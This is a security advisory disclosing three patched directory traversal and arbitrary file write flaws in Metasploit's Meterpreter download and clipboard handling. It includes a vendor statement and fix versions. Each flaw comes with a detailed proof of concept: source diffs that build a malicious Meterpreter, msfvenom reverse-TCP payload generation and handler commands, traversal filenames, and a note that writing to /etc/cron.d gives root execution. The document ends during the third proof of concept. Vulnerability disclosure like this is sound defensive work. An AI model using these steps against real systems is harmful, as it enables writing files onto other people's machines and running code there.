The Metasploit Framework is an open source exploit development and delivery
tool managed primarily by Rapid7, Inc. with a developer community of over 400
contributors and a user community in the hundreds of thousands.

Meterpreter is a payload provided by Metasploit Framework that allows an
instance of Metasploit to remotely control machines on which Meterpreter is
executed. It is often the default payload for Metasploit exploits.

The following issues constitute directory traversal vulnerabilities in
Metasploit. Directory traversal is described at
[CWE-23](https://cwe.mitre.org/data/definitions/23.html).

* CVE-2017-5228: Rapid7 Metasploit Meterpreter stdapi `Dir.download()` Directory Traversal
* CVE-2017-5231: Rapid7 Metasploit stdapi `CommandDispatcher.cmd_download()` Recursive Globbing Arbitrary File Write
* CVE-2017-5229: Rapid7 Metasploit Meterpreter extapi `Clipboard.parse_dump()` Directory Traversal

By running a specially modified version of Meterpreter, a "victim's" machine
can exercise a directory traversal vulnerability and the writing of arbitrary
files to (sometimes) arbitrary locations when an "attacker" uses Metasploit to
download files via the Meterpreter session.

In other words, once a Metasploit user connects to a victim's specially
modified Meterpreter instance, the victim can then opportunistically "hack
back" the original attacker.

In the case of users who run `msfconsole` as root, an attacker could write a
file to `/etc/cron.d/` to gain code execution as root.

The Overall CVSSv3 score for these issues was deemed by Rapid7 to be 4.6
(`CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:L/E:P/RL:O/RC:C/CR:L/IR:L/AR:L/MAV:N/MAC:H/MPR:N/MUI:R/MS:U/MC:H/MI:H/MA:L`)

Rapid7 has released patches for all of these issues as of 8 Feb 2017. Framework
users should update to version 4.13.21. Pro users should update to version
4.13.0-2017020701.

Vendor Statement
----------------

The following is included at the request of Rapid7:

> Rapid7 thanks Justin Steven for proactively coming to us with these
> vulnerabilities. We appreciate the opportunity to practice coordinated,
> reasonable disclosure when it comes to vulnerabilities in our software
> products. We agree that these issues can provide a unique opportunity to
> "trap" Metasploit users by providing a malicious Meterpreter sessions, but of
> course, the attacker has no mechanism to force this attack on a victim. In
> addition to the patches released to address these specific vulnerabilities,
> the use of Meterpreter's Paranoid Mode can significantly reduce the threat of
> this and other undiscovered issues involving malicious Meterpreter sessions.

My motivations, hopes and dreams
--------------------------------

Discovering and disclosing security bugs is an important contribution to
community-driven open-source software. Even if you're a breaker and not a
builder, dive in to the code and give back to the community that builds your
tools.

Users of software, including security assessment and exploitation tools, should
take steps to mitigate against unknown bugs. These tools provide network
services and directly interface with untrusted hosts. Run your tools in
isolated environments. Compartmentalise your work. Don't run software as root
if it can be avoided. Don't let your security, and the security of your
clients, depend only on the correctness of the code you run.

CVE-2017-5228 Rapid7 Metasploit Meterpreter stdapi `Dir.download()` Directory Traversal
---------------------------------------------------------------------------------------

* Public disclosure date: 8 Feb 2017
* Vendor advisory: <https://community.rapid7.com/docs/DOC-3575>
* Affected versions: 4.13.20 and prior

Metasploit's `Rex::Post::Meterpreter::Extensions::Stdapi::Fs::Dir.download()`,
which is used to download directories via a Meterpreter session, is vulnerable
to directory traversal in the saving of downloaded files.

For a machine running Metasploit, when it performs the download of a directory
from a machine on which Meterpreter is running, Meterpreter is able to cause
Metasploit to write arbitrary files at arbitrary locations on the attacker's
filesystem.

Note that simply being the Meterpreter end of a session is not enough to
exploit this bug. Metasploit must explicitly initiate a download to trigger the
vulnerability.

### The bug

`lib/rex/post/meterpreter/extensions/stdapi/fs/dir.rb` defines the
`Dir.download()` function:

```ruby
#
# Downloads the contents of a remote directory a
# local directory, optionally in a recursive fashion.
#
def Dir.download(dst, src, opts, force = true, glob = nil, &stat)
  # <... SNIP - consume opts ...>
  begin
    dir_files = self.entries(src, glob)
  rescue Rex::TimeoutError
    # <... SNIP - handle timeouts ... >
  end
```

`self.entries()` is called to perform a directory listing of files on the
machine running Meterpreter. At this stage, Meterpreter controls the contents
of the array `dir_files`. It is able to tell Metasploit that a bunch of crazily
named files (e.g. `../../../../foo/bar`) exists in the directory of interest.

The function continues:

```ruby
  dir_files.each { |src_sub|
    dst_item = dst + ::File::SEPARATOR + client.unicode_filter_encode(src_sub)
    src_item = src + client.fs.file.separator + client.unicode_filter_encode(src_sub)

    # <... SNIP  - do the download of src_item on the remote machine to dst_item on the local machine ... >
```

The construction of `dst_item` by means of simple concatenation (using the
untrusted filenames as reported by Meterpreter) gives Meterpreter the
opportunity to induce directory traversal on the machine running Metasploit.

### POC

1\. Patch the Windows Meterpreter source code to produce a malicious Meterpreter

We will produce a malicious Windows Meterpreter that returns malformed
responses to Metasploit.

Note that the patching and execution of a modified Meterpreter is just one
method by which the vulnerability can be triggered. Importantly, exploitation
does _not_ require the victim's Metasploit Framework to be modified. The
vulnerability is within Metasploit itself.

To trigger the bug, Meterpreter needs to tell Metasploit that there is a file
on disk with a filename containing the character sequence `../`. As `/` is an
illegal character on most (all?) filesystems, we will patch Meterpreter to
replace all instances of the character `Z` within filenames with the character
`/`

Patch the `fs_ls` function within
`metasploit-payloads/c/meterpreter/source/extensions/stdapi/server/fs/fs_win.c`
as follows:

```text
diff --git a/c/meterpreter/source/extensions/stdapi/server/fs/fs_win.c b/c/meterpreter/source/extensions/stdapi/server/fs/fs_win.c
index 11c49e7..228c3b8 100644
--- a/c/meterpreter/source/extensions/stdapi/server/fs/fs_win.c
+++ b/c/meterpreter/source/extensions/stdapi/server/fs/fs_win.c
@@ -91,10 +91,22 @@ int fs_ls(const char *directory, fs_ls_cb_t cb, void *arg)

                char *filename = wchar_to_utf8(data.cFileName);
                char *short_filename = wchar_to_utf8(data.cAlternateFileName);
                char path[FS_MAX_PATH];

+               for (size_t i = 0; i < strlen(filename); i++) {
+                 if (filename[i] == 'Z') {
+                   filename[i] = '/';
+                 }
+               }
+
+               for (size_t i = 0; i < strlen(short_filename); i++) {
+                 if (short_filename[i] == 'Z') {
+                   short_filename[i] = '/';
+                 }
+               }
+
                if (baseDirectory) {
                        _snprintf(path, sizeof(path), "%s\\%s", baseDirectory, filename);
                } else {
                        _snprintf(path, sizeof(path), "%s", filename);
                }
```

You should then feel deeply ashamed about iterating over the bytes in a
(multi-byte?) string like this, and you should think "surely this won't work".
When it does work, you should make a mental note to learn how to C like a
grown-up.

2\. Build Meterpreter

See <http://buffered.io/posts/building-meterpreter-is-easy/> and
<https://github.com/rapid7/metasploit-payloads/tree/master/c/meterpreter> for
more details.

Copy the built binaries (within `metasploit-payloads/c/meterpreter/output/*/`)
to `metasploit-framework/data/meterpreter/` to make them available to
Metasploit.

3\. Generate a stageless Windows Meterpreter

Be sure to include the stdapi extension. This will result in our patched code
being baked right in to the payload.

```text
% ~/work/metasploitsploit/metasploit-framework/msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=172.18.0.5 LPORT=4444 EXTENSIONS=stdapi -f exe -o ~/work/metasploitsploit/windows_x64_meterpreter_reverse_tcp.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x64 from the payload
WARNING: Local file /home/justin/work/metasploitsploit/metasploit-framework/data/meterpreter/metsrv.x64.dll is being used
WARNING: Local files may be incompatible with the Metasploit Framework
WARNING: Local file /home/justin/work/metasploitsploit/metasploit-framework/data/meterpreter/ext_server_stdapi.x64.dll is being used
No encoder or badchars specified, outputting raw payload
Payload size: 1612339 bytes
Final size of exe file: 1618944 bytes
Saved as: /home/justin/work/metasploitsploit/windows_x64_meterpreter_reverse_tcp.exe
```

4\. Unbuild Meterpreter

Having generated a stageless Windows Meterpreter inclusive of the stdapi
extension, we no longer need the patched Meterpreter binaries within
Metasploit. Scrub them from `metasploit-framework/data/meterpreter/`

5\. Get a session

Start Metasploit, start a stageless Meterpreter handler:

```text
% ~/work/metasploitsploit/metasploit-framework/msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/x64/meterpreter_reverse_tcp
PAYLOAD => windows/x64/meterpreter_reverse_tcp
msf exploit(handler) > set LHOST 172.18.0.5
LHOST => 172.18.0.5
msf exploit(handler) > set LPORT 4444
LPORT => 4444
msf exploit(handler) > set ExitOnSession false
ExitOnSession => false
msf exploit(handler) > exploit -j
[*] Exploit running as background job.
msf exploit(handler) >
[*] Started reverse TCP handler on 172.18.0.5:4444
[*] Starting the payload handler...
```

Run the stageless Meterpreter payload on a remote machine to initiate a
session:

```text
[*] Meterpreter session 1 opened (172.18.0.5:4444 -> 172.17.24.85:49271) at 2016-12-29 21:50:19 +1000
```

6\. Create a malicious directory for download

We know that the patched Meterpreter will replace the character `Z` with `/`
within filenames. To trigger the vulnerability, we'll create a directory layout
as follows:

```text
C:\
|
|-- Users\
   |
   |-- Justin\
      |
      |-- Desktop\
          |
          |-- tasty_loot
              |
              |-- ..Z..Z..Z..Z..Z..Z..Z..Z..Z..ZtmpZdoot.txt
```

Metasploit, when told to download `C:/Users/Justin/Desktop/tasty_loot/`, will
enumerate the contents of the directory and will attempt to download the file
named
`C:/Users/Justin/Desktop/tasty_loot/../../../../../../../../../../tmp/doot.txt`
to `$DESTINATIONDIR/../../../../../../../../../../tmp/doot.txt` which will
trigger the directory traversal vulnerability.

For this to work, we need to ensure that
`C:/Users/Justin/Desktop/tasty_loot/../../../../../../../../../../tmp/doot.txt`
(i.e. `C:/tmp/doot.txt`) exists on the Windows system. This is a very rough
POC, driven somewhat by a crazy state of our own filesystem as an attacker. Our
directory layout will end up being:

```text
C:\
|
|-- Users\
|  |
|  |-- Justin\
|     |
|     |-- Desktop\
|         |
|         |-- tasty_loot
|             |
|             |-- ..Z..Z..Z..Z..Z..Z..Z..Z..Z..ZtmpZdoot.txt
|-- tmp\
    |
    |-- doot.txt
```

Go ahead and create this:

```text
C:\Users\Justin>mkdir Desktop\tasty_loot

C:\Users\Justin>echo >> Desktop\tasty_loot\..Z..Z..Z..Z..Z..Z..Z..Z..Z..ZtmpZdoot.txt

C:\Users\Justin>mkdir \tmp

C:\Users\Justin>echo doot doot >> \tmp\doot.txt

C:\Users\Justin>
```

7\. Trigger the bug

Before triggering the bug, the file doesn't exist on the victim's machine:

```text
msf exploit(handler) > cat /tmp/doot.txt
[*] exec: cat /tmp/doot.txt

cat: /tmp/doot.txt: No such file or directory
```

If we were to take a look at the contents of `tasty_loot` via the Meterpreter
session (using the Meterpreter command `ls`) it would look quite strange:

```text
msf exploit(handler) > sessions -i -1
[*] Starting interaction with 1...

meterpreter > ls C:/Users/Justin/Desktop/tasty_loot
Listing: C:/Users/Justin/Desktop/tasty_loot
===========================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  12    fil   2016-12-29 22:00:39 +1000  ../../../../../../../../../../tmp/doot.txt

meterpreter >
```

Trigger the bug by downloading the attacker's `tasty_loot` directory to
anywhere on the victim's filesystem:

```text
meterpreter > download C:/Users/Justin/Desktop/tasty_loot /home/justin/looted_tasty_loot
[*] downloading: C:/Users/Justin/Desktop/tasty_loot\../../../../../../../../../../tmp/doot.txt -> /home/justin/looted_tasty_loot/../../../../../../../../../../tmp/doot.txt
[*] download   : C:/Users/Justin/Desktop/tasty_loot\../../../../../../../../../../tmp/doot.txt -> /home/justin/looted_tasty_loot/../../../../../../../../../../tmp/doot.txt

meterpreter >
```

The file now exists in `/tmp/`:

```text
meterpreter > ^Z
Background session 1? [y/N]

msf exploit(handler) > cat /tmp/doot.txt
[*] exec: cat /tmp/doot.txt

doot doot
```

The vulnerability can also be exploited if the victim recursively downloads a
directory that is a parent of the malicious directory:

```text
msf exploit(handler) > rm /tmp/doot.txt
[*] exec: rm /tmp/doot.txt

msf exploit(handler) > cat /tmp/doot.txt
[*] exec: cat /tmp/doot.txt

cat: /tmp/doot.txt: No such file or directory

msf exploit(handler) > sessions -i -1
[*] Starting interaction with 1...

meterpreter > download -r C:/Users/Justin/Desktop /home/justin/looted_desktop
[*] downloading: C:/Users/Justin/Desktop\desktop.ini -> /home/justin/looted_desktop/desktop.ini
[*] download   : C:/Users/Justin/Desktop\desktop.ini -> /home/justin/looted_desktop/desktop.ini
[*] mirroring  : C:/Users/Justin/Desktop\tasty_loot -> /home/justin/looted_desktop/tasty_loot
[*] downloading: C:/Users/Justin/Desktop\tasty_loot\../../../../../../../../../../tmp/doot.txt -> /home/justin/looted_desktop/tasty_loot/../../../../../../../../../../tmp/doot.txt
[*] download   : C:/Users/Justin/Desktop\tasty_loot\../../../../../../../../../../tmp/doot.txt -> /home/justin/looted_desktop/tasty_loot/../../../../../../../../../../tmp/doot.txt
[*] mirrored   : C:/Users/Justin/Desktop\tasty_loot -> /home/justin/looted_desktop/tasty_loot

meterpreter > ^Z
Background session 1? [y/N]

msf exploit(handler) > cat /tmp/doot.txt
[*] exec: cat /tmp/doot.txt

doot doot
```

CVE-2017-5231: Rapid7 Metasploit stdapi `CommandDispatcher.cmd_download()` Recursive Globbing Arbitrary File Write
-------------------------------------------------------------------------------------------------------------------

* Public disclosure date: 8 Feb 2017
* Vendor advisory: <https://community.rapid7.com/docs/DOC-3575>
* Affected versions: 4.13.20 and prior

Metasploit's
`Rex::Post::Meterpreter::Ui::Console::CommandDispatcher::Stdapi::Fs::cmd_download()`,
which is used to dispatch download requests to lower-level code, is vulnerable
to a remotely exploitable arbitrary file write bug.

For a machine running Metasploit, when it performs the recursive download of
files matching a glob pattern from a machine on which Meterpreter is running,
Meterpreter is able to cause Metasploit to write arbitrary files at arbitrary
locations on the attacker's filesystem.

Note that simply being the Meterpreter end of a session is not enough to
exploit this bug. Metasploit must explicitly initiate a recursive glob-based
download to trigger the vulnerability.

### The bug

`cmd_download()` is defined as follows:

```ruby
def cmd_download(*args)
  # <... SNIP - consume options ...>

  # Go through each source item and download them
  src_items.each { |src|
    glob = nil
    if client.fs.file.is_glob?(src)
      glob = ::File.basename(src)
      src = ::File.dirname(src)
    end

    # Use search if possible for recursive pattern matching. It will work
    # more intuitively since it will not try to match on intermediate
    # directories, only file names.
    if glob && recursive && client.commands.include?('stdapi_fs_search')

      files = client.fs.file.search(src, glob, recursive)
      <... SNIP - to be continued ...>
```

If the user requests a recursive download using `-r` and specifies a filename
including a glob character (e.g. `*`) and the Meterpreter session provides the
`stdapi_fs_search` function then the above (truncated) codepath is taken.

`client.fs.file.search(src, glob, recursive)` is called. This function is
defined as follows:

```ruby
def File.search( root=nil, glob="*.*", recurse=true, timeout=-1 )
  # <... SNIP - build a search request called 'request' to send to Meterpreter ...>

  response = client.send_request( request, timeout )
  if( response.result == 0 )
    response.each( TLV_TYPE_SEARCH_RESULTS ) do | results |
      files << {
        'path' => client.unicode_filter_encode(results.get_tlv_value(TLV_TYPE_FILE_PATH).chomp( '\\' )),
        'name' => client.unicode_filter_encode(results.get_tlv_value(TLV_TYPE_FILE_NAME)),
        'size' => results.get_tlv_value(TLV_TYPE_FILE_SIZE)
      }
    end
  end

  return files
end
```

It is clear that Meterpreter controls the entirety of the contents of the hash
named `files` which is returned to consumers of `File.search()`. The only
filtering/sanitisation that is done is to remove a single trailing backslash
from "path" values.

Picking up where we left off in `cmd_download`:

```ruby
      # <... SNIP ...>
      files = client.fs.file.search(src, glob, recursive)

      if !files.empty?
        print_line("Downloading #{files.length} file#{files.length > 1 ? 's' : ''}...")

        files.each do |file|
          src_separator = client.fs.file.separator
          src_path = file['path'] + client.fs.file.separator + file['name']
          dest_path = src_path.tr(src_separator, ::File::SEPARATOR)

          client.fs.file.download(dest_path, src_path, opts) do |step, src, dst|
            print_status("#{step.ljust(11)}: #{src} -> #{dst}")
            client.framework.events.on_session_download(client, src, dest) if msf_loaded?
          end
        end
      # <... SNIP ...>
```

The `files` hash, the contents of which are controlled by Meterpreter, is
iterated over. Files are downloaded to locations as per `path` elements in the
`files` hash, leading to an arbitrary file write condition.

### POC

1\. Patch the Windows Meterpreter source code to produce a malicious Meterpreter

We will produce a malicious Meterpreter that returns malformed responses to
Metasploit.

Note that the patching and execution of a modified Meterpreter is just one
method by which the vulnerability can be triggered. Importantly, exploitation
does _not_ require the victim's Metasploit Framework to be modified. The
vulnerability is within Metasploit itself.

To trigger the bug, Meterpreter needs to respond to `stdapi_fs_search` requests
with malicious results. We will patch Meterpreter to append a hardcoded
malicious entry to responses.

Patch the `request_fs_search` function within
`metasploit-payloads/c/meterpreter/source/extensions/stdapi/server/fs/search.c`
as follows:

```text
diff --git a/c/meterpreter/source/extensions/stdapi/server/fs/search.c b/c/meterpreter/source/extensions/stdapi/server/fs/search.c
index aa53e4f..5027a7f 100644
--- a/c/meterpreter/source/extensions/stdapi/server/fs/search.c
+++ b/c/meterpreter/source/extensions/stdapi/server/fs/search.c
@@ -859,10 +859,12 @@ DWORD request_fs_search(Remote * pRemote, Packet * pPacket)
                {
                        dwResult = search(&WDSInterface, NULL, &options, pResponse);
                }
        }

+       search_add_result(pResponse, L"c:\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\tmp", L"doot", 0);
+
        if (pResponse)
        {
                dwResult = packet_transmit_response(dwResult, pRemote, pResponse);
        }

```

2\. Build Meterpreter

See <http://buffered.io/posts/building-meterpreter-is-easy/> and
<https://github.com/rapid7/metasploit-payloads/tree/master/c/meterpreter> for
more details.

Copy the built binaries (within `metasploit-payloads/c/meterpreter/output/*/`)
to `metasploit-framework/data/meterpreter/` to make them available to
Metasploit.

3\. Generate a stageless Windows Meterpreter

Be sure to include the stdapi extension. This will result in our patched code
being baked right in to the payload.

```text
% ~/work/metasploitsploit/metasploit-framework/msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=172.18.0.2 LPORT=4444 EXTENSIONS=stdapi -f exe -o ~/work/metasploitsploit/windows_x64_meterpreter_reverse_tcp.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x64 from the payload
WARNING: Local file /home/justin/work/metasploitsploit/metasploit-framework/data/meterpreter/metsrv.x64.dll is being used
WARNING: Local files may be incompatible with the Metasploit Framework
WARNING: Local file /home/justin/work/metasploitsploit/metasploit-framework/data/meterpreter/ext_server_stdapi.x64.dll is being used
No encoder or badchars specified, outputting raw payload
Payload size: 1612339 bytes
Final size of exe file: 1618944 bytes
Saved as: /home/justin/work/metasploitsploit/windows_x64_meterpreter_reverse_tcp.exe
```

4\. Unbuild Meterpreter

Having generated a stageless Windows Meterpreter inclusive of the stdapi
extension, we no longer need the patched Meterpreter binaries within
Metasploit. Scrub them from `metasploit-framework/data/meterpreter/`

5\. Get a session

Start Metasploit, start a stageless Meterpreter handler:

```text
% ~/work/metasploitsploit/metasploit-framework/msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST 172.18.0.2; set LPORT 4444; set ExitOnSes
sion false; exploit -j'
PAYLOAD => windows/x64/meterpreter_reverse_tcp
LHOST => 172.18.0.2
LPORT => 4444
ExitOnSession => false
[*] Exploit running as background job.

[*] Started reverse TCP handler on 172.18.0.2:4444
[*] Starting the payload handler...
msf exploit(handler) >
```

Run the stageless Meterpreter payload on a remote machine to initiate a
session:

```text
[*] Meterpreter session 1 opened (172.18.0.2:4444 -> 172.17.24.85:49181) at 2017-02-08 19:21:13 +1000
```

6\. Set up the attacker's filesystem

We know that the patched Meterpreter will return
`c:/../../../../../../../../../../../../../../tmp/doot` to the
`request_fs_search` request that Metasploit sends as part of any recursive glob
download request.

Metasploit will then attempt to download the file
`c:/../../../../../../../../../../../../../../tmp/doot` (i.e. the file
`C:/tmp/doot`) to `./c:/../../../../../../../../../../../../../../tmp/doot`
which will trigger the directory traversal vulnerability.

Create a directory layout as follows:

```text
C:\
|
|-- tmp\
   |
   |-- doot
```

```text
C:\Users\Justin>mkdir \tmp

C:\Users\Justin>echo doot doot >> \tmp\doot
```

7\. Trigger the bug

Before triggering the bug, note that `/tmp/doot` does not exist on the victim's
machine:

```text
msf exploit(handler) > cat /tmp/doot
[*] exec: cat /tmp/doot

cat: /tmp/doot: No such file or directory
```

If we were to perform a filesystem search via the Meterpreter session, it would
look quite strange:

```text
msf exploit(handler) > sessions -i -1
[*] Starting interaction with 1...

meterpreter > search -h
Usage: search [-d dir] [-r recurse] -f pattern [-f pattern]...
Search for files.

OPTIONS:

    -d <opt>  The directory/drive to begin searching from. Leave empty to search all drives. (Default: )
    -f <opt>  A file pattern glob to search for. (e.g. *secret*.doc?)
    -h        Help Banner.
    -r <opt>  Recursivly search sub directories. (Default: true)


meterpreter > search -d c:/Users/Justin/Desktop -f foo*txt
Found 3 results...
    C:\Users\Justin\Desktop\foob1.txt (1 bytes)
    C:\Users\Justin\Desktop\foob2.txt (1 bytes)
    c:\..\..\..\..\..\..\..\..\..\..\..\..\..\..\tmp\doot

```

Trigger the bug by performing a recursive globbed download:

```text
meterpreter > download -r c:/Users/Justin/Desktop/foo*txt
Downloading 3 files...
[*] downloading: C:\Users\Justin\Desktop\foob1.txt -> C:/Users/Justin/Desktop/foob1.txt
[*] download   : C:\Users\Justin\Desktop\foob1.txt -> C:/Users/Justin/Desktop/foob1.txt
[*] downloading: C:\Users\Justin\Desktop\foob2.txt -> C:/Users/Justin/Desktop/foob2.txt
[*] download   : C:\Users\Justin\Desktop\foob2.txt -> C:/Users/Justin/Desktop/foob2.txt
[*] downloading: c:\..\..\..\..\..\..\..\..\..\..\..\..\..\..\tmp\doot -> c:/../../../../../../../../../../../../../../tmp/doot
[*] download   : c:\..\..\..\..\..\..\..\..\..\..\..\..\..\..\tmp\doot -> c:/../../../../../../../../../../../../../../tmp/doot
```

`/tmp/doot` now exists:

```text
meterpreter > background
[*] Backgrounding session 1...
msf exploit(handler) > cat /tmp/doot
[*] exec: cat /tmp/doot

doot doot

```

CVE-2017-5229 Rapid7 Metasploit Meterpreter extapi `Clipboard.parse_dump()` Directory Traversal
-----------------------------------------------------------------------------------------------

* Public disclosure date: 8 Feb 2017
* Vendor advisory: <https://community.rapid7.com/docs/DOC-3575>
* Affected versions: 4.13.20 and prior

Metasploit's
`Rex::Post::Meterpreter::Ui::Console::CommandDispatcher::Extapi::Clipboard.parse_dump()`,
which is used to parse and optionally download a victim's clipboard contents
via a Meterpreter session, is vulnerable to directory traversal in the saving
of downloaded files.

For a machine running Metasploit, when it performs the download of clipboard
contents from a machine on which Meterpreter is running, Meterpreter is able to
cause Metasploit to write arbitrary files to the parent directory of the
download destination on the attacker's filesystem.

Note that simply being the Meterpreter end of a session is not enough to
exploit this bug. Metasploit must explicitly initiate a download of clipboard
contents to trigger the vulnerability.

### The bug

An example consumer of `parse_dump()` is
`Rex::Post::Meterpreter::Ui::Console::CommandDispatcher::Extapi::Clipboard.cmd_clipboard_get_data()`
which exposes extapi's `clipboard_get_data` command to the user.

```ruby
def cmd_clipboard_get_data(*args)
  download_content = false
  download_path = nil
  @@get_data_opts.parse(args) { |opt, idx, val|
    case opt
    when "-d"
      download_content = true
      download_path = val
    when "-h"
      print_clipboard_get_data_usage
      return true
    end
  }

  dump = client.extapi.clipboard.get_data(download_content)

  # <... SNIP ...>

  parse_dump(dump, download_content, download_content, download_path)
  return true
end
```

Meterpreter controls the contents of the hash named `dump`. In the case of a
standard file having been copied to the user's clipboard, it will look like:

```text
meterpreter > irb
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client

>> puts client.extapi.clipboard.get_data(true)
{"2017-01-04 12:15:01.0350"=>{"Files"=>[{:name=>"C:\\Users\\Public\\Desktop\\Google Chrome.lnk", :size=>2183}]}}
=> nil
>>
```

Note, however, that Meterpreter has complete control over the path of the file
that was copied to the clipboard.

The function then passes this hash named `dump` to `parse_dump()`:

```ruby
def parse_dump(dump, get_images, get_files, download_path)
  loot_dir = download_path || "."
  if (get_images || get_files) && !::File.directory?( loot_dir )
    ::FileUtils.mkdir_p( loot_dir )
  end

  dump.each do |ts, elements|
    elements.each do |type, v|
      # <... SNIP ...>

      case type
      when 'Text'
        # <... SNIP ...>

      when 'Files'
        total = 0
        v.each do |f|
          print_line("Remote Path : #{f[:name]}")
          print_line("File size   : #{f[:size]} bytes")
          if get_files
            download_file( loot_dir, f[:name] )
          end
          print_line
          total += f[:size]
        end

      when 'Image'
        # <... SNIP ...>

      end
      # <... SNIP ...>
    end
  end
end
```

In the case of the above hash,
`download_file(loot_dir, 'C:\\Users\\Public\\Desktop\\Google Chrome.lnk')`
would be called within the function's `case` statement.

```ruby
def download_file( dest_folder, source )
  stat = client.fs.file.stat( source )
  base = ::Rex::Post::Meterpreter::Extensions::Stdapi::Fs::File.basename( source )
  dest = File.join( dest_folder, base )

  if stat.directory?
    client.fs.dir.download( dest, source, {"recursive" => true}, true ) { |step, src, dst|
      print_line( "#{step.ljust(11)} : #{src} -> #{dst}" )
      client.framework.events.on_session_download( client, src, dest ) if msf_loaded?
    }
  elsif stat.file?
    client.fs.file.download( dest, source ) { |step, src, dst|
      print_line( "#{step.ljust(11)} : #{src} -> #{dst}" )
      client.framework.events.on_session_download( client, src, dest ) if msf_loaded?
    }
  end
end
```

This function determines the type of the file that was copied to the clipboard
and calls the standard file/directory download functions to download it to
`dest_folder/basename(filename)`


Assuming a `dest_folder` of `/home/justin/looted_clipboard`:

* A file named `C:/Foo/Bar.txt` will be downloaded to `/home/justin/looted_clipboard/Bar.txt`
* A directory named `C:/Foo/Buzz` will be downloaded recursively to `/home/justin/looted_clipboard/Buzz`

However, Meterpreter has full control over the path to the file that was
purportedly copied to the clipboard, and so a directory named `C:/Foo/..` will
be downloaded recursively to `/home/justin/looted_clipboard/..` allowing for
the writing of arbitrary files in `/home/justin/`

### POC

1\. Patch the Windows Meterpreter source code to produce a malicious Meterpreter

We will produce a malicious Meterpreter that returns malformed responses to
Metasploit.

Note that the patching and execution of a modified Meterpreter is just one
method by which the vulnerability can be triggered. Importantly, exploitation
does _not_ require the victim's Metasploit Framework to be modified. The
vulnerability is within Metasploit itself.

To trigger the bug, Meterpreter needs to tell Metasploit that a file with a
filename of `..` has been copied to the clipboard. As `..` is an illegal
filename on most (all?) filesystems, we will patch Meterpreter to hardcode the
fact that a file named `C:/doot/doot/..` has been copied to the clipboard.

Patch the `dump_clipboard_capture` function within
`metasploit-payloads/c/meterpreter/source/extensions/extapi/clipboard.c` as
follows:

```text
diff --git a/c/meterpreter/source/extensions/extapi/clipboard.c b/c/meterpreter/source/extensions/extapi/clipboard.c
index a9c5c98..3dfa24e 100644
--- a/c/meterpreter/source/extensions/extapi/clipboard.c
+++ b/c/meterpreter/source/extensions/extapi/clipboard.c
@@ -370,17 +370,17 @@ VOID dump_clipboard_capture(Packet* pResponse, ClipboardCapture* pCapture, BOOL
                pFile = pCapture->lpFiles;

                while (pFile)
                {
                        dprintf("[EXTAPI CLIPBOARD] Dumping file %p", pFile);
                        file = packet_create_group();

                        dprintf("[EXTAPI CLIPBOARD] Adding path %s", pFile->lpPath);
-                       packet_add_tlv_string(file, TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_NAME, pFile->lpPath);
+                       packet_add_tlv_string(file, TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_NAME, "C:\\doot\\doot\\..");

                        dprintf("[EXTAPI CLIPBOARD] Adding size %llu", pFile->qwSize);
                        packet_add_tlv_qword(file, TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_SIZE, pFile->qwSize);

                        dprintf("[EXTAPI CLIPBOARD] Adding group");
                        packet_add_group(group, TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE, file);

                        pFile = pFile->pNext;
```

2\. Build Meterpreter

See <http://buffered.io/posts/building-meterpreter-is-easy/> and
<https://github.com/rapid7/metasploit-payloads/tree/master/c/meterpreter> for
more details.

Copy the built binaries (within `metasploit-payloads/c/meterpreter/output/*/`)
to `metasploit-framework/data/meterpreter/` to make them available to
Metasploit.

3\. Generate a stageless Windows Meterpreter

Be sure to include the extapi extension. This will result in our patched code
being baked right in to the payload (though this ends up being useless in the
case of extapi, as we'll see in step 4)

```text
% ~/work/metasploitsploit/metasploit-framework/msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=172.18.0.5 LPORT=4444 EXTENSIONS=extapi -f exe -o ~/work/metasploitsploit/windows_x64_meterpreter_reverse_tcp.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x64 from the payload
WARNING: Local file /home/justin/work/metasploitsploit/metasploit-framework/data/meterpreter/metsrv.x64.dll is being used
WARNING: Local files may be incompatible with the Metasploit Framework
WARNING: Local file /home/justin/work/metasploitsploit/metasploit-framework/data/meterpreter/ext_server_extapi.x64.dll is being used
No encoder or badchars specified, outputting raw payload
Payload size: 1348147 bytes
Final size of exe file: 1354752 bytes
Saved as: /home/justin/work/metasploitsploit/windows_x64_meterpreter_reverse_tcp.exe
```

4\. Do not unbuild Meterpreter

Since we patched extapi, we need to leave the patched build of Meterpreter
within Metasploit's data directory. Even for a stageless payload that has
extapi baked in to it, you need to do `use extapi` within Metasploit before the
extension's commands will be available to Metasploit. I was under the
impression that Metasploit would not upload a whole new extapi library to
Meterpreter if Meterpreter already has a copy of it, but this did not seem to
be the case in my lab. Metasploit would upload a new copy of extapi, trampling
the patched code within Meterpreter.

An attacker could patch their copy of Meterpreter to just throw away any copy
of the extapi library fed to it by Metasploit. This is an exercise left for the
reader.

5\. Get a session

Start Metasploit, start a stageless Meterpreter handler:

```text
% ~/work/metasploitsploit/metasploit-framework/msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/x64/meterpreter_reverse_tcp
PAYLOAD => windows/x64/meterpreter_reverse_tcp
msf exploit(handler) > set LHOST 172.18.0.5
LHOST => 172.18.0.5
msf exploit(handler) > set LPORT 4444
LPORT => 4444
msf exploit(handler) > set ExitOnSession false
ExitOnSession => false
msf exploit(handler) > exploit -j
WARNING: Local file /home/justin/work/metasploitsploit/metasploit-framework/data/meterpreter/metsrv.x64.dll is being used
WARNING: Local files may be incompatible with the Metasploit Framework
[*] Exploit running as background job.
msf exploit(handler) >
